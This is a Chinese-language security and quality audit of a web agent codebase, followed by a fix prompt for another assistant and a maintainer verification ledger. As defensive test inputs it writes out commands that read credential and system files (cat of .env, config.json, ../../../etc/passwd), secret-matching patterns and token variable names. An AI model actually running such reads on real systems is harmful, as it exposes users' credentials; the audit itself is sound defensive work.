- `src/utils/diff.js createUnifiedDiff` — `change.value.split('\n').filter(Boolean).length` 统计增删行数，`filter(Boolean)` 把空行丢掉 → 只加空行的 diff 计数为 0。
- `src/agent/toolLabel.js:18` — `list_directory` **失败**时返回 `'Explored .'`，文案暗示成功（前端靠 `fail` 类染红补救）。
- `src/tools/normalize.js` — `a.recursive = isTruthy(a.recursive) || a.recursive === true;` 后半段恒为死代码。
- `src/tools/normalize.js` — `firstDefined(a, ['filePath','path','file','filename','filepath','target'])` 把 `target` 当 filePath 别名，与第 1 条的"整份文件覆盖"叠加时风险放大。
- `workbench/js/bridge.js resetRound` — 重置 `state.stats` 时不带 `healthLine` 键；`arenaConnect(text)` 的形参未被使用。
- `installer/launch.js prepareRuntime` — 见到 `.ready` 标记就早退，不重新校验内容完整性；旧 release 目录永不清理，磁盘单调增长。
- `src/tunnel/*` — 每次 `/api/status` 都同步 `which`/`where` 探测二进制；cloudflared 的 exit handler 会把句柄孤立；`stopNgrok` 无调用点（死代码）。
- `src/models/store.js` — 仍有若干残留分支（上一轮已记录，未清理）。

---

## 已核对且**没有问题**的部分（避免下一轮重复劳动）

- 工具总数 30，与 `tools/README.md`、`技术实现.md`、schema 一致。
- `tests/README.md` 通过 15 篇"详解"覆盖全部 52 个测试文件；`webagent-core/` 下 60 篇"详解"与对应源码一致（抽查 `路由逐项详解.md`、`OAuth授权详解.md`、`用量上报详解.md`、`编辑器编排详解.md`、`Bridge与设置详解.md`，均如实描述了实现，包括主动写明自身局限）。
- `extension/` 与 `extensions-installed/webagent.webagent-core-0.6.9/` 逐文件相同，唯一差异是 `extension/README.md`（发行副本不含，属预期）。
- 前端调用的每个 API 端点在 `routes.js` / `oauth.js` / `server.js` 里都存在。`/api/workspace/*`、`/api/simulator/call`、`/api/bridge/rotate-secret` 只出现在冻结的 `webagent-repro/`，不是缺失。`/api/logs` 存在但 UI 未使用（无害）。
- `使用指南.md` 的章节交叉引用（第 5/6/7 节）与实际标题对得上；`README.md:45/:66` 的"第 5 节""第 7 节"同样正确。
- `installer/package.js` 的 allowlist 不含 Node 运行时（要求用户自装，与 README 一致）；PATH 修改幂等。
- `oauth.js authorizeHtml` 的 `escapeHtml` 覆盖 `& < > " '`，隐藏字段全部转义；配对页**不**回显配对码（`OAuth授权详解.md:129` 亦如此声明）。
- `ptyHost.cwdFor` 用 `realpathSync` + `path.relative` 双重约束 cwd，符号链接逃逸被挡。
- `extension.js validWebviewMessage` 对 webview 消息做白名单校验，两个 webview 都是 nonce CSP + `default-src 'none'`。
- 以下模块逐函数读过，未发现阻断性缺陷：`mcp/errors.js`（除第 7 条）、`tools/{normalize,findFiles,gitOps,workspaceInfo,progressTracker,planRound,sensitive,dangerous,readCache,budget,consensusEngine,fileOps,ptyJobs}.js`、`utils/{diff,boundedFile,corsAllow,eventBus,localControl,requestScope}.js`、`models/{memory,profile,store}.js`（除已列条目）、`agent/{openai,toolLabel,planRound}.js`。
- `check-docs.js` 的 `safe()` 拒绝对路径、`..` 与外部符号链接；清单由 `git ls-files` 自动构建，不需要手写根文档名单（本轮一度误判为盲区，实际不是）。它的注释也如实声明"Structural evidence only: generation never certifies the prose's semantics"——即第 27–35 条这类**语义漂移本来就不在 CI 能力范围内**，需要人工或专门的断言测试。

---

## 可优化的地方（不是 bug，是结构与成本）

前面 P0–P3 是"做错了"，这一节是"可以做得更省"。全部带实测数据，便于判断值不值得动。

### 本轮量到的项目体量

| 指标 | 实测值 |
|---|---|
| JS 总行数 | 22,619（去掉 `content.js` 与 `extensions-installed` 副本后 21,549） |
| 产品源码 | src 8,495 + workbench 2,012 + extension 1,070 + docs-site 998 + scripts 449 + admin-host 320 + installer 194 = **13,538** |
| 测试 | 5,591 行 / 52 文件 → **测试:产品代码 = 0.41** |
| 文档 | **155 个 md / 8,254 行** → 文档:产品代码 ≈ **0.61**；其中 `webagent-core/` 内 60 篇"逐函数详解" |
| `.git` / 工作树 | **58 MB / 109 MB**；入库二进制图片 **269 个** |
| `computer-use/` | 34 MB（151 jpg + 93 png + 7 ps1 + 5 cs），**0 行 JS** |
| `docs-site/content.js` | **2.03 MB，单行**，内嵌 166 个文件的**完整源码文本** |
| 最大的几个源文件 | `webagent-repro/public/app.js` 631、`workbench/js/bind.js` 610、`extension/extension.js` 576、`agent/runChat.js` 562、`tools/index.js` 541、`api/routes.js` 531、`mcp/oauth.js` 516 |

### A. 工程化基建（杠杆最高，改动最小）

**A1. 全仓没有任何 linter / formatter 配置。** 根目录、`agent-host/`、`workbench/` 都找不到 eslint / prettier / editorconfig / biome / jsconfig。本轮若干缺陷**正好是 eslint 默认规则能自动抓到的**：

- P0-3 `rec.ok = …` 被两行后的 `rec.ok = result.ok` 覆盖 → `no-self-assign` 类的重复赋值检查
- P3-46 `isTruthy(a.recursive) || a.recursive === true` 恒真死代码
- P3-46 `publicOrigin` / `stopNgrok` 死代码 → `no-unused-vars`

一个 flat config + `no-unused-vars`、`no-self-assign`、`eqeqeq`、`no-constant-binary-expression`、`no-useless-concat`，**零运行时依赖**，就能把这类问题从"靠人工审计发现"变成"提交即拦"。CI 里加一步 `npx eslint .` 即可。

**A2. 没有根 `package.json`，`docs-site/` 与 `installer/` 也各无 `package.json`。** 后果直接体现在 CI 和代码里：`npm ci --prefix webagent-core/agent-host`、`node ../../docs-site/check-docs.js`、以及 `check-docs.js:22` 那句跨包 `require('../webagent-core/agent-host/node_modules/acorn')`。**P1-18/19（安装器抹掉 acorn 导致文档站与两个测试崩溃）的结构性根因就在这里**——一个包去 require 另一个包的 devDependency。改成 npm workspaces（`workspaces: ["webagent-core/agent-host","docs-site"]`，acorn 归 docs-site）能从根上消除这类跨包依赖，顺带给"一条命令跑全部测试/构建"一个入口。

**A3. 测试框架：52 个文件里 0 个用 `node:test`。** 全部是 `require('assert')` + 顶层裸代码，由手写的 `scripts/run-tests.js` 逐个 spawn。代价：

- 无子测试名（失败只报 `FAIL xxx.test.js`，得自己读输出找是哪条断言）
- 无 `--test-name-pattern` 过滤、无 watch、无覆盖率
- **无隔离**：`tests/patchEngine.test.js:12` 直接 `config.workspaceRoot = tmp` 改共享单例，同进程内多个测试文件互相污染只能靠"一个文件一个进程"回避
- 一个未捕获 throw 就整文件失败，后面的断言全部不执行

`node:test` 是 Node 18+ **内置**的（`engines` 已声明 `>=18`），迁移**不引入任何新依赖**，却能拿到子测试、过滤、并行、`mock`。可以渐进迁移：runner 改成 `node --test tests/`，旧文件先包一层 `test('legacy', …)`。

**A4. 版本号三处不一致（扩展 P3-42）。** `agent-host/package.json:3` 是 `"version": "1.0.0"`，而 `extension/package.json:5` 与 `installer/webagent.iss:10` 都是 `0.6.9`。npm 元数据声称 1.0.0、产品声称 0.6.9，两者都对不上。建议以 `src/extensionVersion.js` 为单一来源，加一条一致性测试断言四处相同。

### B. 仓库与产物重量

**B1. 269 个二进制图片进了 git 主历史，`.git` 因此 58 MB。** `computer-use/` 一个目录 34 MB（151 jpg + 93 png，且**没有任何 JS**，只有 7 个 ps1 + 5 个 cs）；`review/shuncode-ui/` 里单张截图 550–840 KB。这些是**验收证据**，不是构建输入——没有代码读它们（除了 P1-16 那个截图白名单，而那恰恰是个缺陷）。建议移到 Git LFS（`.gitattributes` 加 `*.png filter=lfs diff=lfs merge=lfs -text`）或 release 附件，clone 体积可降一个数量级；否则每个新贡献者、每次 CI checkout 都在下载 58 MB 历史。

**B2. `docs-site/content.js` 是 2.03 MB 的单行生成物，且被提交进 git。** `build.js:377-383` 把 166 个文件的**完整源码文本**内联进去（我抽查到 `.github/workflows/test.yml`、`check-env.cmd`、`computer-use/win/*.ps1`、`*.cs` 全文都在里面）。两个后果：

1. P2-44 的日期漂移噪音——每次重建都产生一个 2 MB 单行 diff，review 时完全不可读。
2. **信息暴露面**：`serve.js:11` 是 `HOST = process.env.DOCS_HOST || '127.0.0.1'`，默认回环没问题，但 `DOCS_HOST` 在 5 份文档里被介绍为可配置项。一旦设成 `0.0.0.0`，任何访问者用一个请求就能拉走整棵源码树（含 CI 配置、安装器脚本、全部 src），而 `SECURITY.md` 对文档站只字未提。

建议：`content.js` 不入库（CI 构建 + 产物缓存），或拆成按文件懒加载的分片 JSON；`serve.js` 在非回环 bind 时打印醒目警告并要求显式确认参数。

**B3. `webagent-repro/` 是冻结原型，却含全仓最大的单个 JS 文件。** 23 个文件 / 196 KB，其中 `public/app.js` 631 行——比任何在维护的模块都大。它被 `documentation.config.json` 排除、被测试排除，但 `README.md`、`使用指南.md`、`架构导读.md` 都要花整段解释"这个不是你要跑的程序"。移到独立 tag 或独立仓库，能同时减重量、减文档负担、减新读者的困惑（也顺带消掉 P2-34 里一部分失效链接的来源）。

### C. 安全架构层面（设计选择，不是实现错误）

**C1. 同一套安全逻辑存在 2–3 份手工副本。**

| 逻辑 | 副本 |
|---|---|
| `scrubEnv` | `agent-host/src/tools/executor.js:60`、`extension/ptyHost.js` —— **逐字相同** |
| 危险命令词表 | `agent-host/src/tools/dangerous.js`、`extension/ptyPolicy.js` —— **内容分歧**（见 P3-41） |
| 路径安全判定 | `agent-host` 的 `resolveSafePath`/`isInsideWorkspace`、`extension/ptyHost.js cwdFor` —— 各写一遍 realpath + relative 检查 |

根因是 extension 打包成 VSIX 后不能 `require` agent-host 内部模块，于是复制。**P0-4 之所以"漏一半凭据"，正是因为改一处不会同步另一处。** 建议抽 `webagent-core/shared/`（纯函数、零依赖、不 require `vscode`），由 VSIX 打包与 `installer/package.js` 各自拷贝，并加一条"副本必须逐字节相同"的测试——`extensionCopy.test.js` 已经是这个模式的先例，扩展它即可。

**C2. `express.json({ limit: '20mb' })`（`src/index.js:33`）挂在经公网隧道暴露的那个 app 上。** 而未认证的 `POST /oauth/register` 限流是 20/min/IP（`oauth.js:451`）、`redirect_uris` 数组不限长（:168）。组合起来是 ~400 MB/min 的 JSON 解析放大。补丁本身另有 `MAX_TEXT_BYTES` 上限（`patchEngine.js:273`），实际远小于 20 MB——建议 MCP 路径单独设一个贴合真实需求的 limit（几 MB），并给 register 加 body 大小与字段数量上限。

**C3. 没有统一的"出站脱敏点"。** 回传给远端 MCP 的字符串目前有三条独立出口：命令 stdout（`executor.publicRecord`）、base64 图片附件（`computerUse`，见 P1-16）、diff 文本（`utils/diff.js`）。每条各自决定要不要过滤，而 `sensitive.js` 的敏感路径规则**只管文件工具的入口**（`SECURITY.md` 已如实声明这一点）。建议加一个 `redactOutbound(text)` 出口钩子，对匹配 `sk-[A-Za-z0-9]{16,}`、`ghp_`、`AKIA[0-9A-Z]{16}`、`-----BEGIN … PRIVATE KEY-----`、`xox[baprs]-` 的片段打码。这是纵深防御里**最便宜的一层**：它不依赖入口规则完备，能兜住 P0-2、P0-4、P1-16 三条的共同后果。

**C4. 限流是手写的、且不统一。** `oauth.js:408 rateHits` 是一个裸 `Map`，只保护 `/oauth/register`；`/oauth/authorize`（P1-10）、`/mcp` 调用、`/api/*` 都没有限流。建议抽 `utils/rateLimit.js`（滑动窗口 + 每端点配额），所有公网可达端点统一挂载，并让 `WEBAGENT_*` 可调。

### D. 可观测性与运维

**D1. 缺贯穿式请求 ID。** `utils/requestScope.js` 已经有 AsyncLocalStorage，但没被用来串日志。现在一次远端 MCP 调用 → 派生的 PTY job → `eventBus` 广播 → 工作台卡片，四段之间没有共同标识，排障只能靠时间戳对齐。把 requestScope 里的 id 透传到 tool 结果、PTY job、事件负载，成本很低、收益很大。另外 `/api/logs` 端点存在但 UI 未使用（P2 已记），要么接上要么删掉。

**D2. 健康检查太粗。** `launch.js` 只探 `/healthz`（且写死端口，P1-17）。建议 `/healthz` 返回结构化子项：工作区可写、git 可用、隧道二进制是否存在、模型 key 是否已配、扩展版本是否匹配。安装器和工作台就能给出**具体**失败原因，而不是等 120 秒超时后报一句"启动失败"。

**D3. 同步 IO 散落在热路径上（汇总 P3-37）。** `skills.js`（每次 `getInstructions()` + 每次 `systemPrompt()`）、`profile.js resolveTechStack`（每次模型调用）、`tracker.js`（**每次工具调用**一次 `writeFileSync`）、`gitOps`（每次 `/api/status` 同步 `which`/`where`）。建议统一到一个带 mtime 校验的 `cachedRead`/`cachedStat` 工具，写盘统一 debounce + 原子替换。这既是性能问题，也是 P1-14 那类"崩溃留下半成品文件"的根源。

### E. 文档系统的可持续性（**最大的长期成本**）

**E1. 现状：8,254 行手写散文，全靠人工与代码同步，CI 只校验哈希。** `check-docs.js` 第 3 行的注释自己就写明了边界：`// Structural evidence only: generation never certifies the prose's semantics.` 本轮 **P2-27 到 P2-35 全部是语义漂移，CI 一条都抓不到**——`--disable-workspace-trust` 那种"文档断言的行为被测试明确禁止"的矛盾，可以存在任意久而不报警。文档:代码 ≈ 0.61 的比例意味着这个成本会随代码线性增长。

**E2. 把"可生成的"与"只能人写的"分开。** `check-docs.js:21-50` **已经在用 acorn 解析 AST 并产出 symbols**（含 `name`、`kind`、`startLine`、`endLine`、`parameters`），但这些信息目前只用来算哈希，没有渲染进文档。让它自动生成每篇"详解"里的**函数签名/参数/行号表格**，人只写"为什么这么做、边界在哪、哪些不保证"。这样函数改名/删除/移动时，生成部分会立刻漂移并被哈希检出——**把语义漂移的一半变成机械可查**，同时把人从"数行号"里解放出来。

**E3. 两处手写固定清单违背自己声明的政策。** `tests/README.md` 明确反对固定测试清单，但：`scripts/run-tests.js` 维护了一份 `preferred` 基线并在缺失时 `exit(1)`（P3-43），`documentationLearning.test.js` 维护了一份 `pairs` 数组把测试文件映射到详解文档。两者都会在"新增文件忘记登记"时**静默漏检**（详解守卫覆盖不到新测试）或**误报红灯**（runner 找不到基线里的文件）。改成扫描目录 + 断言"每个文件都有归属"，漏登记时给出指名道姓的错误。

**E4. 关键事实应有断言，不该只写在散文里。** P2-29（四方对"主入口"说法矛盾）、P2-32（目录数 21 vs 25）、P2-33（测试表 30 vs 52）、P2-28（不存在的 `CODE_SERVER_PATH`）、P2-31（0 份文档提到的 `WEBAGENT_AGENT_HOST_URL`）——这些**全都是可枚举的事实**：端口号、默认入口脚本名、工具总数、mode 名列表、环境变量全集、目录清单、测试文件清单。建议：

1. 加一个 `tests/documentationFacts.test.js`，从代码里**提取**这些事实（扫 `process.env.*`、扫 `tools/index.js` 的注册表、扫 `.iss` 的 PostInstall、扫 `git ls-files tests/*.test.js`），再断言各文档里出现的对应字符串与之一致；
2. 指定单一事实来源：`总览.md` 管架构、`使用指南.md` 管操作，其余文档只链接不复述。三份入口文档 + 5 份网页客户端指南 + Conda/Windows/新手手册目前存在大量重复叙述，**P2-29 的矛盾就是重复叙述的必然产物**。

**E5. `.config/` 被整目录排除是个盲区（P2-27）。** `documentation.config.json` 的理由是"历史运行配置，已有目录说明；不扫描用户配置正文"——这个理由对**配置正文**成立，对**目录内手写的 README.md** 不成立。建议排除规则细化为"排除数据文件，保留 `*.md` 的链接与断言校验"，`workspace/` 同理。

### F. CI 与验收

**F1. Windows job 从不启动产品。** `.github/workflows/test.yml` 的 `windows-installer` job 做的是：`npm ci` → `check-docs.js` → `installerPackaging.test.js` → `installer/package.js` → `Add-Type` 编译 3 个 `.cs` + `Parser::ParseFile` 校验 `.ps1` 语法 + 一次无效窗口点击测试 → ISCC `/Qp` 编译安装包。**全程没有运行过 agent-host、code-server 或扩展。** 于是本轮这些只在真实 Windows/code-server 上暴露的问题，CI 永远抓不到：P0-2（PTY 自动批准）、P1-20（`.sh` CRLF）、P1-25（`trustedOrigins` 与 `WEBAGENT_BIND` 互斥）、P1-26（passwordFile 日志）、P1-17（`ready()` 写死端口）。建议加一个冒烟 job：起 agent-host（`WEBAGENT_BIND=127.0.0.1`）→ 打 `/healthz` → 跑一次只读 `/api/chat` → 断言退出码与事件流，再 `run-code-oss.js --dry-run` 校验参数拼装。

**F2. 没有覆盖率度量。** 好消息是**每个 src 模块都至少被一个测试文件引用**（本轮逐模块 grep 验证，无未引用模块）。但"被引用"≠"分支被覆盖"，而本项目的卖点恰恰是"不假报成功"这类分支行为。`node:test` 迁移（A3）后可直接用 Node 内置的 `--experimental-test-coverage`，零新依赖拿到行/分支覆盖率，先给 `patchEngine.js`、`sensitive.js`、`dangerous.js`、`ptyPolicy.js`、`localControl.js` 这五个安全关键模块设阈值。

**F3. 两份 CI Node 版本（ubuntu 20 / windows 22）与 `engines: >=18` 三者不一致。** 建议至少在一个 job 上跑 18（声明的最低版本），否则"支持 Node 18"是未经验证的断言。

### 优化优先级建议

| 优先 | 项 | 理由 |
|---|---|---|
| 1 | **A1 linter** | 一次配置，永久拦住 P0-3/P3-46 那一整类缺陷；成本半天 |
| 2 | **A2 npm workspaces + acorn 归位** | 直接消除 P1-18/19 的根因，而不是打补丁 |
| 3 | **C1 抽 shared 模块** | P0-2/P0-4 都是"两份副本分歧"的结果；不解决会继续发生 |
| 4 | **E2 + E4 文档事实断言** | 把 P2 整节（10 条）从"靠人工审计"变成"CI 拦截" |
| 5 | **B1 图片出 git** | clone 体积 58 MB → 个位数；对贡献者体验影响最直接 |
| 6 | **A3 node:test 迁移 + F2 覆盖率** | 渐进可做，先覆盖 5 个安全关键模块 |
| 7 | **C3 出站脱敏钩子** | 最便宜的纵深防御，兜住三条独立缺陷的共同后果 |
| 8 | **F1 Windows 冒烟 job** | 让"真实 Windows 待验收"这类长期悬空项有一部分自动兜底 |
| 9 | B2 / B3 / D1–D3 / C2 / C4 / A4 / E3 / E5 / F3 | 收益明确但不紧急，可并入日常改动 |

---

## 下一轮修复提示词（可直接交给另一个助手）

```
你在 /home/user/web_agent（分支 arena/01a09b81-web-agent）上工作。先读
review/AUDIT_ROUND3_2026-09-13.md（本轮问题清单）与
review/AUDIT_CROSSCHECK_2026-09-11.md（上轮台账，不要重复其中已修的 F/X 条目）。

约束：
- 每修一条，先写失败测试再改实现；不要为了让测试通过而放宽既有断言。
- tests/README.md 的政策是按目录发现测试，不要新增固定清单。
- 不要碰 webagent-repro/（冻结原型）。
- 改完跑：cd webagent-core/agent-host && npm test（基线 52/52）
  以及 node ../../docs-site/check-docs.js（基线 0 漂移）。
  注意 npm test 会重写 docs-site/content.js 的 builtAt，收尾前恢复工作树。
- 文档改动要与代码同步；凡本轮判定"文档说错"的，改文档而不是改代码来迁就。

按此顺序修（P0 → P1 → P2），每条给出 file:line、修法、新增测试名：

P0-1 patchEngine.js:355-377 —— blocksEarly.length===0 且 patch 含
      /^<{5,}\s*SEARCH/m 或 /^={5,}\s*$/m 时抛 E_BAD_ARGS + retryHint，
      绝不落进"整份文件覆盖"的 else。回归：截断补丁必须被拒且原文件字节不变。
P0-2 extension/ptyPolicy.js:3 —— READISH 的 cat|type|Get-Content 分支接入
      tools/sensitive.js 规则与工作区边界（复用 resolveSafePath 的判定逻辑，
      注意 extension 不能 require agent-host 内部模块，需抽出共享纯函数）。
      回归：cat .webagent/config.json / .env / ../../../etc/passwd 必须走弹窗。
      同时补文档：allowSession=true 的放行范围写进 PTY扩展详解.md 与 SECURITY.md。
P0-3 tools/executor.js:284 —— 删除该行（:277 已是正确守卫）。
      回归：cancelled 的 PTY 结果 publicRecord 必须 ok===false。
P0-4 tools/executor.js:60 + extension/ptyHost.js 的重复 scrubEnv —— 抽成单一模块，
      改为白名单透传或补齐 auth_token/_token$/access_key 等模式。
      回归：NGROK_AUTHTOKEN、CLOUDFLARE_API_TOKEN、CF_TUNNEL_TOKEN、
      AWS_ACCESS_KEY_ID、ANTHROPIC_AUTH_TOKEN、WEBAGENT_TELEMETRY_TOKEN 均不得进入子进程 env。
P0-5 agent/runChat.js:535 —— 'agent' 改为与 :204 一致的合法 mode（或显式校验并
      对未知 mode 抛 E_BAD_ARGS）。回归：省略 mode 的 /api/chat 请求必须拿到非空工具集。

P1-6 models/customizations.js —— loadCustom 区分"文件不存在"与"存在但读不出/解析失败"，
      后者抛错而非返回默认；saveCustom 改原子发布 + 0600 + finally 清理（对齐 store.save）。
P1-7 mcp/errors.js classifyToolError —— 先按 instanceof 分类，message 子串仅兜底，
      并让 "not found" 优先于 "required"/"timeout"。
P1-8 tools/gitOps.js —— 分支名正则改 /^##\s+(\S+?)(?:\.\.\.|\s|$)/；回归 release/1.2.3。
P1-9/10/11 mcp/oauth.js —— registerClient 校验 redirect_uris（https 或显式本机 http，
      限长限数）；pruneClients 不再撤销被驱逐客户端的 token（或改为拒绝注册并返回 503）；
      GET/POST /oauth/authorize 加 rateLimit；5 次失败后不要靠 ensurePairing 静默换码，
      改为要求本机控制面显式重新生成并在 /api/status 里暴露"已作废"状态。
P1-12 mcp/oauth.js:35-40 + :116-118 —— Host 回落加白名单；header 值转义双引号。
P1-13 agent/providers.js listRemoteModels —— 加 AbortSignal.timeout。
P1-14 tools/board.js:47 —— 临时文件名对齐 patchEngine.tempSibling 且被 .gitignore 覆盖，
      加 try/finally 与 mode 0o600。
P1-15 workbench/js/bridge.js:48-51 —— 文案改为"sessions (24h)"，或在 session.js 加定时
      pruneHttpSessions 后仍保留原名。
P1-16 agent/computerUse.js:18 —— COMPUTER_USE_DIR 收进 workspaceRoot；若必须保留仓库根
      例外，则在 SECURITY.md 显式披露，并让 findShotCandidates 的 reBare 只扫命令本身
      与明确的输出标记，不扫全部 stdout。
P1-17/18/19 installer/launch.js + run-tests.cmd + docs-site/check-docs.js:22 ——
      ready() 读 CODE_SERVER_PORT；acorn 归属改为 docs-site 自己的依赖（或 createRequire
      + 降级），run-tests.cmd 的依赖探测同时检查 acorn。
P1-20 .gitattributes —— 追加 *.sh text eol=lf。
P1-21/22 installer/package.js —— 拷 .md、清理旧版本目录；docs-site 要么补
      DOCUMENTATION_SUMMARY.md 进 allowlist，要么从载荷剔除并在 installer/README.md 说明。
P1-23 workbench/js/monaco.js —— vendored 优先、CDN 兜底；在 SECURITY.md 增"外部依赖"小节。
P1-24 workbench/app.js openSite() —— 开隧道前给出可见提示或二次确认。
P1-25 scripts/run-code-oss.js —— trustedOrigins 随 WEBAGENT_BIND 扩展，或文档写明互斥。
P1-26 scripts/codeServerAuth.js / run-code-oss.js —— 环境密码分支不要打印不存在的 passwordFile。

P2-27 .config/code-server/README.md:32 —— 删掉 --disable-workspace-trust 的说法；
      并评估把 .config/**/*.md 纳入 check-docs 的链接校验（保留对配置正文的排除）。
P2-28 网页VSCode使用指南.md:115 —— 删除 CODE_SERVER_PATH，改通顺。
P2-29 README.md:44/:55/:63 vs 使用指南.md:70 vs installer/webagent.iss vs run-webagent.cmd 头注释
      —— 统一"默认壳 = run-webagent-vscode.cmd，经典工作台 = 备用"。
P2-30 SECURITY.md —— 新增"用量上报"小节（默认关闭、payload 含 installId + GitHub 身份、
      不含模型 Key/MCP secret/命令正文、如何彻底关闭）。
P2-31 补 WEBAGENT_AGENT_HOST_URL 文档（桌面扩展指南 + 使用指南第 5 节）。
P2-32 DOCUMENTATION_SUMMARY.md §5 目录清单补到 25。
P2-33 测试说明.md 总表补齐 52 个测试文件（或由脚本生成）。
P2-34 打包载荷的 82 个失效相对链接：打包时改写或补收目标文件。
P2-35 代码级文档方案新/旧.md 的示例链接改为行内代码。

P3-37..46 见清单，逐条按"抽共享模块 / 加缓存 / 修文案 / 删死代码"处理；
      第 41 条（两套危险命令词表）与第 42 条（版本号 4 处）优先，它们是长期分歧源。
      第 44 条要同时改 build.js 与 test.yml：让 content.js 的字节只取决于输入内容，
      再加一条 CI 断言重建后 git diff --exit-code docs-site/content.js。

优化项（见"可优化的地方"一节，按该节末尾的优先级表推进，可与上面的修复并行）：
      OPT-A1 加 eslint flat config（no-unused-vars / no-self-assign / eqeqeq /
             no-constant-binary-expression），CI 加 npx eslint . 一步。
      OPT-A2 建根 package.json + npm workspaces，acorn 归 docs-site，删掉
             check-docs.js:22 的跨包 require（这是 P1-18/19 的根因，优先于打补丁）。
      OPT-A3 渐进迁移到 node:test（内置，零新依赖），runner 改 node --test tests/。
      OPT-A4 版本号统一到 src/extensionVersion.js，加四处一致性断言（含
             agent-host/package.json 现在写的是 1.0.0，与产品 0.6.9 不符）。
      OPT-B1 269 个入库图片移到 Git LFS 或 release 附件；computer-use/ 34 MB 优先。
      OPT-B2 content.js 不入库或拆分片懒加载；serve.js 非回环 bind 时警告。
      OPT-B3 webagent-repro/ 移到独立 tag/仓库。
      OPT-C1 抽 webagent-core/shared/（scrubEnv、危险命令词表、路径安全判定），
             VSIX 与 installer 各自拷贝，并断言副本逐字节相同。
      OPT-C2 MCP app 的 express.json limit 从 20mb 收到贴合 MAX_TEXT_BYTES 的值；
             /oauth/register 加 body 大小与字段数量上限。
      OPT-C3 加 redactOutbound(text) 统一出站脱敏（sk-/ghp_/AKIA/BEGIN PRIVATE KEY/xox）。
      OPT-C4 抽 utils/rateLimit.js，所有公网可达端点统一挂载。
      OPT-D1 用 requestScope 的 AsyncLocalStorage 贯穿 request id 到 tool 结果/PTY job/事件。
      OPT-D2 /healthz 返回结构化子项，安装器与 UI 据此给具体失败原因。
      OPT-D3 统一 cachedRead/cachedStat（mtime 校验），写盘 debounce + 原子替换。
      OPT-E2 用 check-docs.js 已有的 acorn symbols 自动生成详解里的函数签名/行号表格。
      OPT-E3 run-tests.js 的 preferred 与 documentationLearning.test.js 的 pairs
             改为目录扫描 + "每个文件都有归属"断言。
      OPT-E4 新增 tests/documentationFacts.test.js：从代码提取端口/默认入口/工具总数/
             mode 名/环境变量全集/目录清单/测试清单，断言各文档字符串与之一致。
      OPT-E5 documentation.config.json 的 .config/ 与 workspace/ 排除细化为
             "排除数据文件，保留 *.md 校验"。
      OPT-F1 CI 加 Windows 冒烟 job：起 agent-host → /healthz → 一次只读 /api/chat。
      OPT-F2 迁移 node:test 后开 --experimental-test-coverage，先给 patchEngine /
             sensitive / dangerous / ptyPolicy / localControl 五个模块设阈值。
      OPT-F3 至少一个 CI job 跑 Node 18（engines 声明的最低版本）。

全部完成后：把结果按 F/X 台账格式追加到 review/AUDIT_ROUND3_2026-09-13.md 末尾
（每条：编号 / 是否属实 / 修法 / 测试名 / 仍需真机验收的部分），
不要新开报告文件，也不要在报告里宣称已通过 Windows / 真实 VS Code / 浏览器验收，
除非确实跑过。
```


## 维护者交叉验证台账（2026-09-14，持续更新）

基线：用户上传提交152d207（产品4d518c1）；Windows Node24.20.0/npm11.19.0的step5日志真实失败3/52。原三份审查保留为来源，不删除证据、不以报告建议替代源码。当前只完成下列批次，其他项仍待逐条复核，不能宣称全项目收尾。

| 编号/来源 | 核对与处置 | 证据与边界 |
|---|---|---|
| W1 用户workspaceTools失败 | 旧poll仅20×50ms，扩大为15秒明确期限并附末状态；成功从允许timeout收紧为done/exit0 | 原日志command did not finish；本地定向测试通过，待Windows矩阵 |
| W2 用户monacoLoading失败 | import剥离只适配LF属实；测试同时构造LF/CRLF并支持两者 | 原日志import SyntaxError，定向双EOL通过 |
| W3 用户chatVision失败 | PowerShell echo别名将裸-Out当参数，fixture改完整引号图片路径，先验证真实工具结果再检查图片 | 原日志image_url缺失；Linux定向通过，待Windows矩阵确认 |
| P1-20 Shell EOL | .gitattributes缺Shell LF属实；新增*.sh text eol=lf | CMD/BAT规则不变 |
| OPT-F1/F3 Windows自动化缺口 | 之前Windows仅安装器，新增Ubuntu/Windows Node20/22/24全量矩阵 | 未覆盖Node18最低声明；不代替桌面/UAC/手机人工验收 |
| 第一报告“store坏配置静默回退/缺sessionHash/CORS扩展/refresh重放测试” | 当前已有fail-closed、sessionHash、WEBAGENT_CORS_ORIGINS和重放断言；不可按旧报告重做或降低安全边界 | stateIntegrity、workspaceTools、corsAllow、oauth测试及源码 |
| 第一报告“Cloudflare头允许本机API/单分支start违反两分支merge” | 混淆拒绝头与放行、start与merge，是误读 | localControl对隧道返回false；Plan创建与总结是不同操作 |
| 其余P0/P1/P2与优化建议 | 待逐条核验及补负例；优先防数据损坏/凭据泄漏 | 不采用配对码落盘、开放远程UI、强杀仅凭旧PID等危险建议 |

旧REPORT*/ShunCode报告暂按历史留档，旧活台账降为前轮证据；统一以本节和CHECKLIST_WINDOWS区分当前修复与真实验收。无需现在大量移动文件制造断链。用户原始日志可能含用户名/路径，分享前脱敏。

### 高风险修复批次

| 编号 | 核对/修正 | 回归 |
|---|---|---|
| P0-1 | 属实；parseSearchReplaceBlocks完整匹配后检查残余标记，防单个截断和混合截断、已有/新建/dryRun | patchEngine新增负例修改前Missing expected rejection，修后通过；原字节不变 |
| P0-2 | 属实；默认不再自动批准文件正文及Git历史；已会话/命令族允许也对识别出的正文读取询问；补高风险命令 | ptyLifecycle修改前cat .env误允许，修后拒自动批准；不声称命令解析完备 |
| P0-3 | 属实；删除迟到result.ok覆盖，cancelCommand立即ok:false | ptyLifecycle模拟取消后迟到ok:true仍返回cancelled/false |
| P0-4 | 属实；scrubEnv移到扩展纯策略模块，host与PTY共用，补token/access/storage key；额外发现终端环境合并风险，fallback用strictEnv | 合成凭据/保留Conda/PATH/输入不变及终端参数断言；仍非值扫描/OS沙箱 |
| P0-5 | 属实；runChat默认ask，非法mode明确失败 | modelLifecycle修改前defaultTools不存在，修后只读工具集正确 |

以上不代表其他P1–P3/优化建议已完成；真实Windows桌面/授权/手机仍需用户验收。扩展策略变化是安全收紧：普通cat也需要单次确认，不用词法路径假装能判定符号链接安全。

### P1存储/错误与新Windows CI发现

| 编号 | 核实与修复 | 验证 |
|---|---|---|
| P1-6 | custom坏配置确会回默认；改仅缺文件默认、其他E_CUSTOM_CORRUPT保留；逐文件wx/0600/rename/finally | stateIntegrity新增负例原实现失败，修后通过；仍非四文件事务 |
| P1-7 | instanceof优先原来已有，真正缺陷是not found被required文件名误分 | required.md/timeout.log回E_NOT_FOUND |
| P1-8 | 含点分支截短属实；只按三点upstream分隔 | 临时release/1.2.3回归修前失败 |
| P1-13 | provider探测无期限属实；复用fetchText，默认15秒覆盖读正文及取消 | providers短期限fixture拒绝 |
